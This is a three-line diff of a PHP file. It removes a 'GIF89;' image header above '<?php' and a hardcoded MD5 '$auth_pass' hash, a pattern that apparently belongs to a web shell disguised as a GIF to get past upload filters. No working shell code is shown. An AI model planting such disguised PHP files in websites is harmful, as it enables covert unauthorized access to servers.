@@ -1,4 +1,3 @@
-GIF89;
 <?php
 
 $auth_pass = "240963573bcf2208b73406e6ba200d4f";
